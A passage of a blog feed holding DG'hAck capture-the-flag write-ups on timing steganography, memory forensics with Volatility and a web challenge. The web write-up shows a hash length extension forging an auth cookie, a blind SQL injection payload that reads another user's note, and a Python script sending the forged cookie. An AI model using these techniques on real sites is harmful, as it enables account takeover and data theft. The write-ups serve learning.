+$ tshark -r data.pcap -T fields -e frame.time_epoch 1604485685.271523000 1604485685.974534000 1604485686.737381000 1604485687.390550000 1604485688.103364000 1604485689.336651000 1604485690.500205000 1604485690.982931000 1604485691.465408000 1604485692.617796000 1604485693.701056000 1604485694.814156000 1604485695.686772000 1604485696.799993000 1604485697.943153000 1604485699.106441000 1604485699.589015000 1604485700.071611000 1604485700.754520000 1604485701.266580000 1604485702.449633000 1604485702.942506000 1604485704.054744000 1604485705.</description><content>&lt;p>This is a steganography challenge where we&amp;rsquo;re given a PCAP file. Opening it in wireshark reveals a list of identical ICMP packets.&lt;/p>
+&lt;p>Nothing seems to be unique, except the time of each packet, that we can extract using &lt;code>tshark&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ tshark -r data.pcap -T fields -e frame.time_epoch
+1604485685.271523000
+1604485685.974534000
+1604485686.737381000
+1604485687.390550000
+1604485688.103364000
+1604485689.336651000
+1604485690.500205000
+1604485690.982931000
+1604485691.465408000
+1604485692.617796000
+1604485693.701056000
+1604485694.814156000
+1604485695.686772000
+1604485696.799993000
+1604485697.943153000
+1604485699.106441000
+1604485699.589015000
+1604485700.071611000
+1604485700.754520000
+1604485701.266580000
+1604485702.449633000
+1604485702.942506000
+1604485704.054744000
+1604485705.228047000
+1604485705.589787000
+1604485706.843252000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip; there isn&amp;rsquo;t anything that stands out. We could also look at the time delta in between each packet:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ tshark -r data.pcap -T fields -e frame.time_delta
+0.000000000
+0.703011000
+0.762847000
+0.653169000
+0.712814000
+1.233287000
+1.163554000
+0.482726000
+0.482477000
+1.152388000
+1.083260000
+1.113100000
+0.872616000
+1.113221000
+1.143160000
+1.163288000
+0.482574000
+0.482596000
+0.682909000
+0.512060000
+1.183053000
+0.492873000
+1.112238000
+1.173303000
+0.361740000
+1.253465000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Hmm.. The first bit looks like binary, but decoding it gives nothing useful. Looking at the second and third lines, the deltas start with &lt;code>70&lt;/code> and &lt;code>76&lt;/code>, which are the ASCII codes for &lt;code>F&lt;/code> and &lt;code>L&lt;/code>.&lt;/p>
+&lt;p>This is it, the first three chars without the dot represent ASCII codes, let&amp;rsquo;s decode them:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ tshark -r data.pcap -T fields -e frame.time_delta | python -c &lt;span style="color:#e6db74">&amp;#39;import sys; print(&amp;#34;&amp;#34;.join(map(lambda d: chr(int(d.replace(&amp;#34;.&amp;#34;, &amp;#34;&amp;#34;)[:3])), sys.stdin)))&amp;#39;&lt;/span>
+FLAG&lt;span style="color:#f92672">{&lt;/span>t00sloWort00D3v1ou$&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>t00sloWort00D3v1ou$&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: StickItUp</title><link>https://nicolasb.fr/blog/writeup-dghack-stickitup/</link><pubDate>Mon, 30 Nov 2020 11:26:24 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-stickitup/</guid><description>When starting this challenge, we&amp;rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:
 We&amp;rsquo;re asked to find a note created by the admin user. I started by trying a few SQLi on the login page (they didn&amp;rsquo;t work), and noticed this in the source code:
-&amp;lt;!-- $_COOKIES[&amp;#39;auth&amp;#39;] = &amp;#39;testuser:&amp;#39; . sha1(SECRET_KEY . &amp;#39;testuser&amp;#39;); --&amp;gt; So the auth cookie format is username:hash, where the hash is a SHA1 of a secret plus the username.</description></item><item><title>Writeup DG'hAck: Bwing</title><link>https://nicolasb.fr/blog/writeup-dghack-bwing/</link><pubDate>Mon, 30 Nov 2020 07:19:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-bwing/</guid><description>For this challenge, we&amp;rsquo;re given a dump.raw file, which we&amp;rsquo;re told is a memory dump. We have to find confidential data in it.
+&amp;lt;!-- $_COOKIES[&amp;#39;auth&amp;#39;] = &amp;#39;testuser:&amp;#39; . sha1(SECRET_KEY . &amp;#39;testuser&amp;#39;); --&amp;gt; So the auth cookie format is username:hash, where the hash is a SHA1 of a secret plus the username.</description><content>&lt;p>When starting this challenge, we&amp;rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/stick-it-up-dashboard.png">&lt;img src="https://nicolasb.fr/assets/dghack/stick-it-up-dashboard.png" alt="The dashboard">&lt;/a>&lt;/p>
+&lt;p>We&amp;rsquo;re asked to find a note created by the &lt;code>admin&lt;/code> user. I started by trying a few SQLi on the login page (they didn&amp;rsquo;t work), and noticed this in the source code:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;!--&lt;/span> $_COOKIES[&lt;span style="color:#e6db74">&amp;#39;auth&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;testuser:&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#a6e22e">sha1&lt;/span>(&lt;span style="color:#a6e22e">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;testuser&amp;#39;&lt;/span>); &lt;span style="color:#f92672">--&amp;gt;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>So the &lt;code>auth&lt;/code> cookie format is &lt;code>username:hash&lt;/code>, where the hash is a SHA1 of a secret plus the username.&lt;/p>
+&lt;p>Now this &lt;strong>should&lt;/strong> immediatly make you think of an &lt;a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">hash key length extension attack&lt;/a>. It allows an attacker to append arbitrary data at the end of the hashed value.&lt;/p>
+&lt;p>Looking at the cookies, we do find the hash:&lt;/p>
+&lt;pre>&lt;code>test:14dc77bd8d95f3093afd7b8538a518ac17dcac14
+&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s check that the attack is working, using the &lt;a href="https://github.com/bwall/HashPump">hashpump tool&lt;/a>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ hashpump -s 14dc77bd8d95f3093afd7b8538a518ac17dcac14 -d test -a suffix -k &lt;span style="color:#ae81ff">16&lt;/span>
+6cfe1c2b324630def13b186bb3f1c675e79d8c23
+test&lt;span style="color:#ae81ff">\x&lt;/span>80&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>a0suffix
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The first line is the new hash, the second is the updated data. I tried different keylengths before finding the right one. The cookie we have to set is:&lt;/p>
+&lt;pre>&lt;code>auth=test%C2%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C2%A0suffix%3A6cfe1c2b324630def13b186bb3f1c675e79d8c23
+&lt;/code>&lt;/pre>&lt;p>&lt;em>Warning: if you struggle to generate the cookie, be sure that you pasted the username correctly; for example in python use &lt;code>b&amp;quot;&amp;quot;&lt;/code> instead of &lt;code>&amp;quot;&amp;quot;&lt;/code>, or directly use the &lt;code>hashpumpy&lt;/code> module.&lt;/em>&lt;/p>
+&lt;p>After a quick reload, we see:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/stick-it-up-edited-username.png">&lt;img src="https://nicolasb.fr/assets/dghack/stick-it-up-edited-username.png" alt="The edited username seen when logging in">&lt;/a>&lt;/p>
+&lt;p>Which confirms that the exploit is working. For the next part, we have to notice this message on the registration form:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/stick-it-up-only-letters-numbers.png">&lt;img src="https://nicolasb.fr/assets/dghack/stick-it-up-only-letters-numbers.png" alt="The registration form">&lt;/a>&lt;/p>
+&lt;p>While it&amp;rsquo;s not unusual for the charset of a username to be restricted, in our case we&amp;rsquo;re free to add any character that we want. It&amp;rsquo;s worth a shot to try an SQLi.&lt;/p>
+&lt;p>After adding a single quote to the username, we can&amp;rsquo;t create notes anymore. This is a blind SQLi!&lt;/p>
+&lt;p>To help create a payload, we can guess both the table name and structure, as well as the query:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> note (
+username text,
+title text,
+content text
+);
+&lt;span style="color:#75715e">-- Add a sample flag.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">INSERT&lt;/span> &lt;span style="color:#66d9ef">INTO&lt;/span> note &lt;span style="color:#66d9ef">VALUES&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;admin&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;flag&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;flag&amp;#34;&lt;/span>);
+&lt;span style="color:#75715e">-- This is the query we&amp;#39;re trying to break.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">INSERT&lt;/span> &lt;span style="color:#66d9ef">INTO&lt;/span> notes &lt;span style="color:#66d9ef">VALUES&lt;/span> (username, &lt;span style="color:#e6db74">&amp;#34;title&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;content&amp;#34;&lt;/span>);
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="http://sqlfiddle.com">SQL Fiddle&lt;/a> was of great help. The injection we can find, after a few attempts, is:&lt;/p>
+&lt;pre>&lt;code>&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;), (&amp;quot;test&amp;quot;, &amp;quot;flag&amp;quot;, (select content from note a limit 1))#
+&lt;/code>&lt;/pre>&lt;p>Note the table alias, which I forgot to add for quite a while. The injection works by inserting a second row, in the account that we want, with the first note in the table.&lt;/p>
+&lt;p>After creating the updated username and hash, logging in with the forged cookie, and attempting to create a note, we switch to the &lt;code>test&lt;/code> account, and see:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/stick-it-up-flag.png">&lt;img src="https://nicolasb.fr/assets/dghack/stick-it-up-flag.png" alt="The note of the test user">&lt;/a>&lt;/p>
+&lt;p>Here we go, the flag is &lt;code>-+-{{akUX7Aihx9}}-+-&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>Bonus: the script I used to easily try different SQLi:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> sys
+&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;span style="color:#f92672">import&lt;/span> hashpumpy
+&lt;span style="color:#f92672">import&lt;/span> urllib.parse
+DATA &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>
+SIGNATURE &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;14dc77bd8d95f3093afd7b8538a518ac17dcac14&amp;#34;&lt;/span>
+suffix &lt;span style="color:#f92672">=&lt;/span> sys&lt;span style="color:#f92672">.&lt;/span>argv[&lt;span style="color:#ae81ff">1&lt;/span>]
+new_signature, new_string &lt;span style="color:#f92672">=&lt;/span> hashpumpy&lt;span style="color:#f92672">.&lt;/span>hashpump(SIGNATURE, DATA, suffix, &lt;span style="color:#ae81ff">16&lt;/span>)
+cookie &lt;span style="color:#f92672">=&lt;/span> urllib&lt;span style="color:#f92672">.&lt;/span>parse&lt;span style="color:#f92672">.&lt;/span>quote(new_string &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> new_signature&lt;span style="color:#f92672">.&lt;/span>encode())
+requests&lt;span style="color:#f92672">.&lt;/span>post(
+&lt;span style="color:#e6db74">&amp;#34;http://stickitup.chall.malicecyber.com/notes.php&amp;#34;&lt;/span>,
+data&lt;span style="color:#f92672">=&lt;/span>{
+&lt;span style="color:#e6db74">&amp;#34;title&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>,
+},
+cookies&lt;span style="color:#f92672">=&lt;/span>{
+&lt;span style="color:#e6db74">&amp;#34;auth&amp;#34;&lt;/span>: cookie,
+},
+)
+&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Bwing</title><link>https://nicolasb.fr/blog/writeup-dghack-bwing/</link><pubDate>Mon, 30 Nov 2020 07:19:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-bwing/</guid><description>For this challenge, we&amp;rsquo;re given a dump.raw file, which we&amp;rsquo;re told is a memory dump. We have to find confidential data in it.
 First, let&amp;rsquo;s see what kind of image this is:
-$ volatility -f dump.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : No suggestion (Instantiated with no profile) AS Layer1 : FileAddressSpace (/home/vivescere/Projects/dghack/bwing/dump.raw) PAE type : No PAE None of the default profiles seem to work, we&amp;rsquo;ll have to create our own.</description></item><item><title>Writeup DG'hAck: Sad Crypto</title><link>https://nicolasb.fr/blog/writeup-dghack-sad-crypto/</link><pubDate>Mon, 30 Nov 2020 01:33:35 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-sad-crypto/</guid><description>This challenge starts with a login page:
+$ volatility -f dump.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : No suggestion (Instantiated with no profile) AS Layer1 : FileAddressSpace (/home/vivescere/Projects/dghack/bwing/dump.raw) PAE type : No PAE None of the default profiles seem to work, we&amp;rsquo;ll have to create our own.</description><content>&lt;p>For this challenge, we&amp;rsquo;re given a &lt;code>dump.raw&lt;/code> file, which we&amp;rsquo;re told is a memory dump. We have to find confidential data in it.&lt;/p>
+&lt;p>First, let&amp;rsquo;s see what kind of image this is:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility -f dump.raw imageinfo
+Volatility Foundation Volatility Framework 2.6.1
+INFO : volatility.debug : Determining profile based on KDBG search...
+Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : No suggestion &lt;span style="color:#f92672">(&lt;/span>Instantiated with no profile&lt;span style="color:#f92672">)&lt;/span>
+AS Layer1 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>/home/vivescere/Projects/dghack/bwing/dump.raw&lt;span style="color:#f92672">)&lt;/span>
+PAE type : No PAE
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>None of the default profiles seem to work, we&amp;rsquo;ll have to create our own. First, let&amp;rsquo;s find out about the linux version:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ strings dump.raw | grep -i &lt;span style="color:#e6db74">&amp;#39;linux version&amp;#39;&lt;/span>
+Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
+Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
+Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
+o The intent is to make the tool independent of Linux version dependencies,
+On some Linux version, write-only pipe are detected as readable. This
+o The intent is to make the tool independent of Linux version dependencies,
+On some Linux version, write-only pipe are detected as readable. This
+On some Linux version, write-only pipe are detected as readable. This
+&lt;span style="color:#ae81ff">0045&lt;/span> Raptor 4000-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
+004a Raptor 4000-LR-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
+Nov &lt;span style="color:#ae81ff">6&lt;/span> 09:47:15 ubuntu-bionic kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
+Nov &lt;span style="color:#ae81ff">6&lt;/span> 09:47:15 ubuntu-bionic kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
+00000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
+MESSAGE&lt;span style="color:#f92672">=&lt;/span>Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
+SWIMS: Linux Version: %04X
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>So it&amp;rsquo;s an Ubuntu 18.04.1, with the 4.15.0-66-generic kernel. We can find the image on the &lt;a href="http://old-releases.ubuntu.com/releases/18.04.1/ubuntu-18.04-desktop-amd64.iso">old-releases.ubuntu.com&lt;/a> website. After booting up a VM and installing the system, we&amp;rsquo;ll install the kernel we want:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ sudo su
+$ apt install linux-image-4.15.0-66-genericlinux-headers-4.15.0-66-generic
+$ reboot
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>And create the profile:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ sudo su
+$ apt install volatility-tools build-essential linux-headers-4.15.0-66-generic
+$ cd /usr/src/volatility-tools/linux
+$ make
+$ zip ubuntu_custom.zip module.dwarf /boot/System.map-4.15.0-66-generic
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After getting the profile from the VM, we have to load it:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cp ubuntu_custom.zip /usr/lib/python2.7/site-packages/volatility/plugins/overlays/linux/ubuntucustom.zip
+$ volatility --info | grep ubuntu
+Volatility Foundation Volatility Framework 2.6.1
+Linuxubuntucustomx64 - A Profile &lt;span style="color:#66d9ef">for&lt;/span> Linux ubuntucustom x64
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can finally get to work, after trying to list the processes, let&amp;rsquo;s try to list the mounts:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxubuntucustomx64 -f dump.raw linux_mount
+Volatility Foundation Volatility Framework 2.6.1
+cgroup /sys/fs/cgroup/rdma cgroup ro,relatime,nosuid,nodev,noexec
+/dev/sda1 / ext4 ro,relatime
+tmpfs /sys/fs/cgroup tmpfs ro,nosuid,nodev,noexec
+cgroup /sys/fs/cgroup/freezer cgroup rw,relatime,nosuid,nodev,noexec
+devpts /dev/pts devpts rw,relatime,nosuid,noexec
+securityfs /sys/kernel/security securityfs rw,relatime,nosuid,nodev,noexec
+ramfs /mnt/confidential ramfs rw,relatime
+systemd-1 /proc/sys/fs/binfmt_misc autofs rw,relatime
+cgroup /sys/fs/cgroup/blkio cgroup rw,relatime,nosuid,nodev,noexec
+cgroup /sys/fs/cgroup/pids cgroup ro,relatime,nosuid,nodev,noexec
+udev /dev devtmpfs rw,relatime,nosuid
+tmpfs /run/lxcfs/controllers tmpfs rw,relatime
+cpuset /run/lxcfs/controllers/cpuset cgroup rw,relatime
+sysfs /sys sysfs ro,relatime,nosuid,nodev,noexec
+cgroup /sys/fs/cgroup/unified cgroup2 rw,relatime,nosuid,nodev,noexec
+devices /run/lxcfs/controllers/devices cgroup rw,relatime
+memory /run/lxcfs/controllers/memory cgroup rw,relatime
+cgroup /sys/fs/cgroup/systemd cgroup rw,relatime,nosuid,nodev,noexec
+tmpfs /lib/modules/dir tmpfs ro,relatime,nosuid,noexec
+vagrant /vagrant vboxsf rw,relatime,nodev
+pstore /sys/fs/pstore pstore rw,relatime,nosuid,nodev,noexec
+cgroup /sys/fs/cgroup/hugetlb cgroup ro,relatime,nosuid,nodev,noexec
+mqueue /dev/mqueue mqueue rw,relatime
+fusectl /sys/fs/fuse/connections fusectl rw,relatime
+proc /proc proc rw,relatime,nosuid,nodev,noexec
+debugfs /sys/kernel/debug debugfs rw,relatime
+cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,relatime,nosuid,nodev,noexec
+lxcfs /var/lib/lxcfs fuse rw,relatime,nosuid,nodev
+hugetlbfs /dev/hugepages hugetlbfs rw,relatime
+configfs /sys/kernel/config configfs ro,relatime
+cgroup /sys/fs/cgroup/perf_event cgroup rw,relatime,nosuid,nodev,noexec
+tmpfs /dev/shm tmpfs rw,nosuid,nodev
+tmpfs /run/lock tmpfs rw,relatime,nosuid,nodev,noexec
+cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,relatime,nosuid,nodev,noexec
+tmpfs /dev tmpfs ro,nosuid,noexec
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>/mnt/confidential&lt;/code> folder is particularly interesting, let&amp;rsquo;s try to find files in it:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxubuntucustomx64 -f dump.raw linux_enumerate_files | grep &lt;span style="color:#e6db74">&amp;#39;/mnt/confidential&amp;#39;&lt;/span>
+Volatility Foundation Volatility Framework 2.6.1
+0xffff95a89ac58528 &lt;span style="color:#ae81ff">256033&lt;/span> /mnt/confidential
+0xffff95a89ac74000 &lt;span style="color:#ae81ff">22086&lt;/span> /mnt/confidential
+0xffff95a89ac72260 &lt;span style="color:#ae81ff">22114&lt;/span> /mnt/confidential/flag.txt
+$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxubuntucustomx64 -f dump.raw linux_find_file -i 0xffff95a89ac72260 -O flag.txt
+Volatility Foundation Volatility Framework 2.6.1
+$ cat flag.txt
+C0D3N4M34P011011
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>C0D3N4M34P011011&lt;/code>.&lt;/p>
+&lt;hr>
